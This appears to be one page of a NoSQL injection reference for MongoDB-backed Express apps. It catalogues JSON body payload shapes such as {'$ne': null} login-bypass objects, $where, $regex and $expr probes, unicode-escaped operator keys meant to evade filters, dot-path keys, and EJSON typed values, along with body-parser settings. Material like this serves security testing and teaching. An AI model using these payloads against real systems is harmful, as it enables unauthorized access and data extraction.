# The JSON carrier deep — the `Content-Type: application/json` body

## The `express.json` — the direct-object

```javascript
app.use(express.json())
app.use(bodyParser.json())
```

`Content-Type: application/json` + `{"user": {"$ne": null}}` — the object
reaches `req.body` directly — the simplest carrier — `injection-points.md`.

## The JSON grammar — the object-vs-scalar

```json
{"user": "admin"}                         — scalar
{"user": {"$ne": null}}                   — operator-object
{"user": {"$ne": null, "$gt": ""}}        — multi-operator
{"user": [{"$ne": null}]}                 — array-wrapped operator
{"user": {"a": {"$ne": null}}}            — nested
{"user": {"$regex": "^a", "$options": "i"}}  — operator+options
{"$or": [{"user": "a"}, {"user": "b"}]}   — top-level $or
{"$and": [{"user": {"$ne": null}}]}       — top-level $and
{"$where": "this.pass"}                   — top-level $where
{"user": {"$where": "this.pass"}}         — field-level $where
{"user": {"$expr": {"$eq": ["$a", "b"]}}} — field-level $expr
{"$expr": {"$eq": ["$user", "admin"]}}    — top-level $expr
```

The `$`-key can sit at the ROOT or inside a FIELD — `operators.md`.

## The `"$"`-in-string — the literal `$`

```json
{"user": "$ne"}
{"user": {"$n": "e"}}
{"user": {"$eq": "$ne"}}
{"user": "\\$ne"}
{"user": {"$$ne": null}}
{"user": {"$n\\u0065": null}}
{"user": {"$\\u006ee": null}}
{"user": {"$\\u0065e": null}}
```

The literal-`$` — `"$ne"` as a VALUE is a string, not an operator —
the escape-forms — `filter-bypass.md`.

## The `$$`-prefix — the agg-variable

```json
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 1]}, "f"]}}
{"$let": {"vars": {"p": "$pass"}, "in": {"$eq": ["$$p", "x"]}}}
```

`$$var` — the agg-variable — `operators-aggregation.md`.

## The `"."`-in-key — the dot-path

```json
{"profile.role": {"$ne": "user"}}
{"meta.flag": {"$exists": true}}
{"a.b.c": "x"}
{"a.b": {"$ne": null}}
{"a.b.c.d": {"$exists": true}}
{"0.user": {"$ne": null}}
{"items.0.price": {"$gt": 100}}
{"items.$.price": {"$gt": 100}}
{"items.$[].price": {"$gt": 100}}
{"items.$[x].price": {"$gt": 100}}
{"user.$ref": "x"}
{"user.$id": "x"}
{"user.$db": "x"}
```

The `.`-key — `filter-bypass.md`.

## The `[]`-in-value — the array-shape

```json
{"user": ["admin"]}
{"user": [{"$ne": null}]}
{"user": [{"$ne": null}, {"$gt": ""}]}
{"user": [["admin"]]}
{"user": {"$in": ["admin", "root"]}}
{"user": {"$all": ["a", "b"]}}
{"user": {"$nin": []}}
{"user": {"$or": [{"a": 1}]}}
{"user": {"$size": 2}}
```

The array-value — `operators.md`.

## The `{}`-in-value — the nested-object

```json
{"user": {"$ne": null}}
{"user": {"$ne": {"$ne": null}}}
{"user": {"a": {"$ne": null}}}
{"user": {"a": {"b": {"$ne": null}}}}
{"user": {"a.b": {"$ne": null}}}
{"user": {"": {"$ne": null}}}
{"user": {"$": "x"}}
{"user": {"$$": "x"}}
{"user": {"$a": {"$b": {"$c": null}}}}
```

Nested objects — the depth-limit — `injection-points.md`.

## The `null`/`true`/`false` — the literals

```json
{"user": null}
{"user": true}
{"user": false}
{"user": 0}
{"user": 1}
{"user": ""}
{"user": []}
{"user": {}}
{"user": {"$ne": null}}
{"user": {"$eq": null}}
{"user": {"$exists": true}}
{"user": {"$exists": false}}
{"user": {"$type": "null"}}
{"user": {"$type": 10}}
```

The literal-vs-operator — `operators.md`.

## The `JSON.parse` — the string-carrier

```javascript
const q = JSON.parse(req.query.filter)
const q = JSON.parse(req.body.q)
const q = JSON.parse(req.headers['x-filter'])
```

`JSON.parse` on a param/header — the object survives as a string —
`injection-points.md`.

## The `EJSON` — the extended-JSON

```json
{"user": {"$oid": "507f1f77bcf86cd799439011"}}
{"user": {"$date": "2024-01-01"}}
{"user": {"$numberInt": "1"}}
{"user": {"$numberLong": "1"}}
{"user": {"$binary": {"base64": "...", "subType": "00"}}}
{"user": {"$regex": "^a", "$options": "i"}}
{"user": {"$regularExpression": {"pattern": "^a", "options": "i"}}}
{"user": {"$undefined": true}}
{"user": {"$minKey": 1}}
{"user": {"$maxKey": 1}}
{"user": {"$timestamp": {"t": 0, "i": 0}}}
{"user": {"$uuid": "..."}}
{"user": {"$symbol": "x"}}
{"user": {"$code": "..."}}
{"user": {"$code": "...", "$scope": {}}}
{"user": {"$dbPointer": {"$ref": "x", "$id": {"$oid": "..."}}}}
{"user": {"$ref": "x", "$id": "y"}}
{"user": {"$id": {"$oid": "..."}, "$ref": "x", "$db": "y"}}
```

EJSON — the `$`-typed values — `mongo-specific.md`.

## The `$oid` — the ObjectId-shape

```json
{"_id": {"$oid": "507f1f77bcf86cd799439011"}}
{"_id": {"$oid": "000000000000000000000000"}}
{"_id": {"$oid": "ffffffffffffffffffffffff"}}
{"user_id": {"$oid": "..."}}
{"user": {"$oid": "..."}}
```

`$oid` — the ObjectId literal — `mongo-specific.md`.

## The `$date` — the Date-shape

```json
{"created": {"$date": "2024-01-01"}}
{"created": {"$date": {"$numberLong": "1704067200000"}}}
{"created": {"$date": "2024-01-01T00:00:00Z"}}
```

`$date` — `mongo-specific.md`.

## The `$$`-in-key — the `$$ROOT`/`$$NOW`

```json
[{"$project": {"doc": "$$ROOT"}}]
[{"$project": {"now": "$$NOW"}}]
[{"$project": {"p": "$$p"}}]
```

`$$ROOT`/`$$NOW`/`$$p` — the agg-variables — `operators-aggregation.md`.

## The `strict` — the `JSON.parse` failure

```text
{"user": {$ne: null}}       — INVALID JSON — parse-fails
{"user": {"$ne": null}}     — valid — the $ is a key, not a token
```

The unquoted `$ne` is invalid JSON — `error-analysis.md`.

## The body-parser limits — the size-cap

```javascript
app.use(express.json({limit: "100kb"}))
```

`bodyParser`'s `limit` — the size-falsifier — `denied-conditions.md`.

## The `type` — the content-type check

```javascript
app.use(express.json({type: "application/json"}))
app.use(express.json({type: ["application/json", "application/*+json"]}))
app.use(express.json({type: () => true}))
```

`type` — the content-type the parser accepts — `filter-bypass.md`.
